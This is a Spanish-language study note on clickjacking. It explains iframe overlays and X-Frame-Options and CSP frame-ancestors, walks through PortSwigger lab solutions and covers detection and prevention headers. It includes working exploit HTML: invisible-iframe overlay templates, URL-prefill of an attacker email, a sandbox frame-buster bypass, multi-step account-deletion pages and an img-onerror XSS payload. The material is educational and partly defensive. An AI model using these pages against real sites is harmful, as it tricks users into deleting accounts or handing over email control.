---
aliases: ["Clickjacking", "UI Redressing", "Ataque de Clickjacking", "Framejacking"]
tags:
  - sec/web
  - sec/web/cliente
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Cross-Site Request Forgery (CSRF)]]"
  - "[[Cross-Site Scripting XSS]]"
  - "[[Vulnerabilidades CORS y Laboratorios]]"
  - "[[Client-Side Template Injection (CSTI)]]"
fuente: "https://portswigger.net/web-security/clickjacking"
---

# Clickjacking Ataques

El **clickjacking** (también llamado **UI Redressing**) es un ataque en el que un atacante superpone una interfaz legítima —invisible o casi invisible— bajo un contenido que el usuario *sí* ve, de modo que su clic, destinado aparentemente al contenido visible, **cae sobre la interfaz oculta** y ejecuta una acción autenticada en un sitio de confianza.

> [!info] Concepto de Clickjacking
> El ataque consiste en cargar la página víctima dentro de un `iframe` dentro de la web del atacante, manipular la opacidad/posición del iframe y colocar encima un elemento atractivo ("¡Gana un iPhone!", "Pulsa aquí para continuar"). El navegador entrega el clic al iframe subyacente porque el navegador no distingue *por qué motivo* el usuario hizo clic — solo registra *dónde* cayó el evento. La víctima realiza, con su sesión válida, exactamente la acción que el atacante programó.

## Mecánica: por qué el navegador permite enmarcar y por qué el clic cae dentro

Entender el ataque requiere entender el modelo de framing y eventos del navegador:

| Concepto | Mecánica |
|---|---|
| **`iframe` cross-origin** | Un `iframe` puede cargar **cualquier origen** (salvo que el destino lo impida). La *Same Origin Policy* restringe la **lectura/escritura** del DOM entre orígenes, **no la visualización ni la interacción** |
| **Capas de apilamiento** | El contenido del iframe se pinta en su propia caja; los elementos del padre con `position: absolute/relative` e `z-index` se pintan **encima** y reciben los clics |
| **Opacidad** | `opacity: 0.001` (no `0`: algunos navegadores descartan elementos totalmente transparentes del hit-testing) hace el iframe invisible pero **clickeable** |
| **Hit-testing** | El navegador resuelve el clic contra el elemento visualmente superior; si el overlay dice "click", el usuario cree hacer clic en el overlay, pero el evento real se distribuye según capas |
| **Autenticación** | El iframe se carga **con las cookies de la víctima** (salvo `SameSite` estricto; ver más abajo), de modo que la página oculta aparece ya autenticada |
| **`X-Frame-Options` / `frame-ancestors`** | Son los ÚNICOS mecanismos que el destino puede usar para negar ser enmarcado. Sin ellos, cualquier sitio puede enmarcarlo |

El flujo del ataque:

```
1. Víctima autenticada en victima.com
2. Visita atacante.com
3. atacante.com carga <iframe src="https://victim.com/accion-peligrosa">
4. El iframe renderiza la UI de victim.com (cookies viajan, sesión activa)
5. Overlay invisible + bait visible encima del botón crítico
6. Clic de la víctima → cae en el iframe → victim.com procesa la acción con la sesión de la víctima
```

> [!warning] Clickjacking no necesita romper la SOP
> El atacante **nunca lee** el contenido del iframe (la SOP se lo impide). Solo necesita que se **pinte** y que **reciba clics**. Por eso las defensas de framing son el único control efectivo, y por eso un token CSRF no protege contra clickjacking: el clic de la víctima genera una petición **legítima y completa**, con token CSRF válido incluido. Ver [[Cross-Site Request Forgery (CSRF)]].

### X-Frame-Options vs CSP frame-ancestors

| Mecanismo | Sintaxis | Alcance | Notas |
|---|---|---|---|
| `X-Frame-Options: DENY` | Cabecera HTTP | Nadie puede enmarcar | Legacy (IE8+), aún soportado |
| `X-Frame-Options: SAMEORIGIN` | Cabecera HTTP | Solo la misma origin | El más usado históricamente |
| `Content-Security-Policy: frame-ancestors 'none'` | Cabecera HTTP | Nadie, estándar moderno | Reemplazo oficial de XFO |
| `Content-Security-Policy: frame-ancestors 'self'` | Cabecera HTTP | Solo mismo origen | Equivalente SAMEORIGIN |
| `Content-Security-Policy: frame-ancestors https://app.ejemplo.com` | Cabecera HTTP | Lista explícita de orígenes | Permite widgets de partners |

> [!tip] Diferencia práctica
> `frame-ancestors` **reemplaza** a XFO y lo supera: permite listas de orígenes (XFO solo sabe "yo mismo" o "nadie"), funciona en navegadores modernos y se combina con otras directivas CSP. La configuración defensiva correcta hoy es **ambas**: XFO por compatibilidad con navegadores viejos, `frame-ancestors` como política real. Ver la sección de prevención.

## Metodología de ataque

1. **Detectar si la página es enmarcable**: intentar cargarla en un `iframe` propio. Si se pinta, no hay defensa de framing. Automatizable: página PoC con `<iframe src=victima>` y observación.
2. **Localizar la acción valiosa**: cambios de email/contraseña, eliminación de cuenta, publicación de contenido, pagos, retweets (historia clásica: Twitter 2009).
3. **Ajustar posición y tamaño**: abrir DevTools, inspeccionar el botón dentro del iframe (inspección indirecta: posicionar a ojo con coordenadas relativas), ajustar `top`/`left` del overlay hasta que coincida.
4. **Ocultar**: `opacity: 0.001` en el iframe (o `opacity` en el overlay con transparencia). Alternativa moderna: `pointer-events: none` en el contenido visible del atacante para que los clics atraviesen.
5. **Prefill de la acción**: si la acción requiere campos (email nuevo, mensaje), usar el prefill por parámetros de URL si la app lo permite — así el iframe carga con el formulario ya con el valor atacante.
6. **Multi-paso**: si la acción tiene confirmación, encadenar varios clics posicionados en secuencia.
7. **Burlar frame busters**: si la víctima carga JS que rompe el framing, usar `sandbox` en el iframe (ver sección de bypass).

### Catálogo de payloads: página del atacante

**Plantilla básica (un clic):**

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.1;          /* invisible pero clickeable (nunca 0 exacto) */
  }
  div {
    position: relative;    /* encima del iframe */
    top: 510px;
    left: 45px;
  }
</style>

<div>click</div>
<iframe src="https://VICTIMA/mi-cuenta"></iframe>
```

**Prefill vía parámetro de URL** (para acciones con campos):

```html
<style>
  iframe { width: 500px; height: 600px; opacity: 0.001; }
  div { position: relative; top: 460px; left: 50px; }
</style>

<div>click</div>
<iframe src="https://VICTIMA/mi-cuenta?email=hacked@hacked.com"></iframe>
```

**Bypass de frame buster con `sandbox`** (sin `allow-scripts`, el JS de la víctima no corre → su frame buster no se ejecuta, pero los forms se envían):

```html
<iframe sandbox="allow-forms" src="https://VICTIMA/mi-cuenta?email=hacked@hacked.com"></iframe>
```

| Valor de `sandbox` | Efecto en el iframe |
|---|---|
| *(vacío)* | Todo bloqueado: sin scripts, sin forms, sin popups, sin navegación |
| `allow-forms` | Permite enviar forms (suficiente para clickjacking de forms) |
| `allow-scripts` | Ejecuta JS — **anula el bypass** si el frame buster vive en JS |
| `allow-scripts allow-same-origin` | Combinación peligrosa: el iframe retiene su origin y sus cookies plenas |

**Multi-paso (borrar + confirmar):**

```html
<style>
  iframe { width: 500px; height: 600px; opacity: 0.000001; }
  .firstClick { position: absolute; top: 497px; left: 60px; }
  .nextClick  { position: absolute; top: 290px; left: 200px; }
</style>

<div class="firstClick">Click me first</div>
<div class="nextClick">Click me next</div>

<iframe src="https://VICTIMA/mi-cuenta"></iframe>
```

### Variantes / clases de clickjacking

| Variante | Mecánica | Notas |
|---|---|---|
| **Básico** | Overlay sobre botón en iframe | El caso estándar de arriba |
| **Con token CSRF** | El clic genera la petición legítima con token | CSRF no protege; solo XFO/frame-ancestors |
| **Con prefill de URL** | Campos prellenados por query string | El iframe ya llega con el valor atacante |
| **Frame buster bypass** | `sandbox` sin `allow-scripts` | El JS víctima no corre |
| **Multi-paso** | Varios clics en secuencia | Borrar + confirmar |
| **Dragjacking** | Interfaz estirable con CSS (`width` grande) que hace deslizar el mouse hacia la zona oculta | Variantes con `box-sizing` y sliders |
| **Clickjacking + XSS** | El iframe entrega un clic que inyecta XSS (feedback form) | Cadena a código ejecutado (lab abajo) |
| **Cursor spoofing** | Overlay dibuja un cursor falso en otra posición | Refuerza la ingeniería social |

## PortSwigger

### Basic clickjacking with CSRF token protection

El objetivo es lograr que la víctima elimine su cuenta al hacer clic en nuestra web.

> [!info] Protección CSRF y Clickjacking
> Los tokens CSRF protegen contra la falsificación de solicitudes, no contra el clickjacking: el atacante engaña al usuario para que *genere* una solicitud legítima con el token válido. La protección real contra clickjacking son `X-Frame-Options` o `frame-ancestors`.

Vamos a jugar con `iframe` primero para cargar la página con el botón de eliminar:

```html
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account" width="100%" height="100%"></iframe>
```

![[Pasted image 20250912090309.png]]

![[Pasted image 20250912090337.png]]

El propósito es insertar otro texto dentro del botón. Jugamos con HTML para lograrlo. El resultado:

```html
<style>
iframe{
  width: 500px;
  height: 600px;
  opacity: 0.1;
}
div{
  position: relative;
  top:510px;
  left:45px;
}
</style>

<div>click</div>
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account"></iframe>
```

> [!tip] Opacidad en `iframe`
> Reducir la opacidad a valores muy bajos (`0.1`, `0.001`) hace el contenido legítimo casi invisible mientras el overlay ("click") captura la atención; el clic cae en el iframe oculto.

Esto es válido y, aunque no me funcione el Lab en el momento, se debería completar.

---

### Lab: Clickjacking with form input data prefilled from a URL parameter

Como el objetivo es cambiar el email, capturamos la petición que permite hacer eso:

![[Pasted image 20250912115350.png]]

Observamos cómo está construida: vemos qué seguridad cumple el `csrf`, si podemos eliminarlo o cambiar el método, etc. No encontramos nada fuera de lo común, así que intentamos insertar información desde la URL en el campo de correo. Usualmente para esto se emplea un parámetro con el `id`, `class` o `name` del campo:

![[Pasted image 20250912115908.png]]

Vemos que se llama `email`. Probamos si nos deja asignar valor desde la URL:

![[Pasted image 20250912120359.png]]

Perfecto: mediante el parámetro `email` podemos dar valor al campo sin enviar la solicitud.

> [!tip] Prefill de campos vía URL
> Muchos formularios permiten prellenar campos con parámetros de la URL (`?email=valor`). Esta funcionalidad de UX puede explotarse en clickjacking o phishing para presentar el formulario ya completado con datos del atacante.

Con esto claro, creamos nuestra web maliciosa:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
  }
</style>

<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912120829.png]]

Vemos qué sucede:

![[Pasted image 20250912120916.png]]

Perfecto, el campo ya está relleno. Aplicamos el mismo proceso de ocultamiento que en el lab anterior:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912122350.png]]

Con esto se completa la máquina. Lab terminado.

---

### Lab: Clickjacking with a frame buster script

Este laboratorio tiene el mismo objetivo, con un problema: la web impide cargarse dentro de un `iframe` mediante un script (frame buster).

Para burlarlo usamos el atributo `sandbox`: al definirlo en el `iframe` se restringe todo lo que cargue; como el objetivo es un formulario, pasamos el valor `allow-forms` — el JS de la víctima queda deshabilitado, y con él su frame buster:

```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe sandbox="allow-forms"
  src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

> [!warning] Frame busters y `sandbox`
> Los frame busters son scripts tipo `if (top != self) { top.location.replace(self.location); }`. `sandbox="allow-forms"` los neutraliza porque sin `allow-scripts` el JS del iframe no ejecuta. Es una defensa **del atacante** contra la defensa **del defensor** — el defensor real debe usar cabeceras, no JS.

![[Pasted image 20250912131446.png]]

Con esto el Lab está terminado.

---

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

En este lab lo primero es encontrar el XSS. Mediante búsqueda se determina que está en el apartado de `feedback`, exactamente en el campo `name`:

![[Pasted image 20250912133236.png]]

![[Pasted image 20250912133423.png]]

El objetivo es cargar información en cada campo y, mediante clickjacking, hacer que el usuario envíe la petición maliciosa. Primero verificamos si podemos rellenar los campos desde la URL:

```url
https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=Name&email=test@test.com&subject=hola&message=hola
```

![[Pasted image 20250912133759.png]]

Perfecto, logramos cambiar los campos mediante la URL. Creamos la web maliciosa, inyectando en `name` el `print()` que pide el lab:

```html
<style>
  iframe {
    width: 500px;
    height: 900px;
    opacity: 0.0001;
  }

  div {
    position: relative;
    top: 810px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe
  src="https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=<img+src=0+onerror='print()'>&email=test@test.com&subject=hola&message=hola"></iframe>
```

> [!info] XSS basado en DOM y Clickjacking
> La combinación es potente: el clickjacking entrega el clic que inyecta el payload XSS en el DOM de la víctima, llevando a ejecución de código en el contexto del sitio (robo de sesiones, redirecciones, manipulación de contenido). Ver [[Cross-Site Scripting XSS]].

![[Pasted image 20250912134611.png]]

Lo enviamos y se resuelve. Lab terminado.

---

### Lab: Multistep clickjacking

Cadena de ataque donde el usuario borra su cuenta y luego confirma la operación — dos clics posicionados en secuencia:

```html
<style>
iframe{
  width:500px;
  height: 600px;
  opacity: 0.000001;
}
.firstClick{
  position: absolute;
  top:497px;
  left:60px;
}
.nextClick{
  position: absolute;
  top:290px;
  left:200px;
}
</style>

<div class="firstClick">Click me first</div>
<div class="nextClick">Click me next</div>

<iframe src="https://0a8c008c0417d47785676eb5005c00ca.web-security-academy.net/my-account"></iframe>
```

![[Pasted image 20250912165605.png]]

![[Pasted image 20250912165613.png]]

Lab terminado.

## Detección (defensor)

- Auditoría de cabeceras en todas las respuestas: `X-Frame-Options` y `Content-Security-Policy: frame-ancestors` deben estar presentes **en cada endpoint que renderice acciones**, no solo en el home.
- CSP violaciones reportadas (`report-uri`/`report-to`) con `frame-ancestors` — indica intentos de framing real.
- Monitorizar tráfico referer desde dominios desconocidos con paths de acciones (señal débil, el referrer puede suprimirse).
- Prueba continua: herramienta que intente enmarcar las páginas críticas y falle si alguna carga.

## Impacto

1. **Acciones autenticadas sin consentimiento**: transferencias, cambio de email/contraseña, eliminación de datos, publicación de contenido — todo lo que un clic pueda activar.
2. **Robo de credenciales (credential jacking)**: overlay sobre un formulario de login real con campos movidos — la víctima teclea su contraseña real en la interfaz visible que está debajo.
3. **Cadena a XSS/RCE**: cuando el clic dispara una inyección (lab de feedback) el clickjacking es solo el delivery de un payload mayor.
4. **Bypass de 2FA en flujos antiguos**: clics sobre códigos/confirmaciones en apps mal segmentadas.
5. El ataque funciona con cookies de sesión normales; con `SameSite=Lax/Strict` el framing cross-site puede perder cookies — ver interacción en [[Cross-Site Request Forgery (CSRF)]].

## Prevención (con configuración)

Cabeceras en el servidor (la única defensa efectiva — el JS defensivo es secundario):

```nginx
# Nginx — defensa moderna + compatibilidad
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
# Variante: permitir solo a tu app de partner
# add_header Content-Security-Policy "frame-ancestors 'self' https://partner.com" always;
```

```apache
# Apache (.htaccess / vhost)
Header always set X-Frame-Options "SAMEORIGIN"
Header always set Content-Security-Policy "frame-ancestors 'self'"
```

```python
# Flask
@app.after_request
def sec_headers(resp):
    resp.headers["X-Frame-Options"] = "SAMEORIGIN"
    resp.headers["Content-Security-Policy"] = "frame-ancestors 'self'"
    return resp
```

```nginx
# Nginx — denegar framing globalmente si ninguna página necesita ser embebida
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

Reglas de diseño:
- **Cabeceras, no frame busters**: el JS defensivo (`top != self`) es evadible con `sandbox` (lab de arriba) y con deshabilitación de JS; las cabeceras las impone el navegador.
- Proteger **todas** las páginas con sesión, no solo las sensibles — cualquier acción clickeable es un target.
- No usar `frame-ancestors` con comodines (`*`) ni `unsafe-inline` de orígenes.
- Si tu app SÍ necesita ser embebida (embeds de video, SSO), lista blanca explícita de orígenes.
- Complementar con `SameSite=Lax` en cookies de sesión (reduce el framing efectivo con cookies cross-site) — ver CSRF.

## Errores comunes

**Atacante:**
1. Posicionar el overlay a ojo sin inspeccionar coordenadas del botón real — pierdes tiempo; usar DevTools sobre el iframe (inspección indirecta) o variar `top/left` sistemáticamente.
2. Usar `opacity: 0` exacto — en algunos contextos el elemento se considera no visible para hit-testing; usar `0.001` o `0.000001`.
3. Olvidar que con `sandbox` sin `allow-scripts`, los bots de PortSwigger de envío automático pueden no funcionar si dependen de JS.
4. No verificar si la víctima necesita estar autenticada: si el iframe carga el login en vez de la acción, el clic no sirve.
5. Ignorar `SameSite`: con cookies `Strict` el iframe cross-site puede cargar sin sesión y mostrar login — el ataque necesita `Lax`/`None` o el usuario recién llegado del mismo sitio.

**Defensor (falsas soluciones):**
1. **Frame busters en JS** — evadibles con `sandbox="allow-forms"` (lab) o con navegador sin JS.
2. Token CSRF como "protección contra clickjacking" — el clic genera token válido automáticamente.
3. Proteger solo el home y dejar `/mi-cuenta` sin cabeceras.
4. `X-Frame-Options` sin `frame-ancestors` (y viceversa): la CSP es la política moderna; XFO solo da compatibilidad.
5. Confiar en que "nadie enmarca nuestro sitio" sin verificar las cabeceras realmente emitidas.

## Cheatsheet

| Elemento | Valor/atajo |
|---|---|
| Invisible pero clickeable | `opacity: 0.001` |
| Overlay encima | `position: absolute/relative; z-index` |
| Permitir solo formularios | `sandbox="allow-forms"` |
| Neutralizar frame buster | `sandbox` sin `allow-scripts` |
| Prefill | `?email=valor` en la URL del iframe |
| Cabecera legacy | `X-Frame-Options: DENY / SAMEORIGIN` |
| Cabecera moderna | `Content-Security-Policy: frame-ancestors 'none' / 'self' / lista` |
| Verificar framing | Cargar la URL en un iframe local y ver si pinta |

| Señal | Significado |
|---|---|
| La víctima niega framing (pantalla en blanco en iframe) | Cabeceras activas — buscar otra vía |
| El iframe pinta autenticado | Target viable |
| La acción requiere dos clics | Lab multi-paso |
| `sandbox` rompe el iframe | Falta `allow-forms` |

## Laboratorios y referencias

- PortSwigger Academy — Clickjacking (todos los labs de arriba): https://portswigger.net/web-security/clickjacking
- OWASP — Clickjacking Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- MDN — X-Frame-Options: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
- MDN — CSP frame-ancestors: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors

## Relacionadas

- [[Cross-Site Request Forgery (CSRF)]] — el hermano del clickjacking: ambos abusan de la autenticación por cookies; los tokens CSRF no detienen el clickjacking
- [[Cross-Site Scripting XSS]] — el clickjacking como delivery de XSS (lab de feedback) y el `javascript:` en `href`
- [[Vulnerabilidades CORS y Laboratorios]] — otra política del navegador que, mal configurada, expone datos cross-origin
- [[Client-Side Template Injection (CSTI)]] — relación entre ambos: ejecución de código en el contexto de la víctima desde un iframe
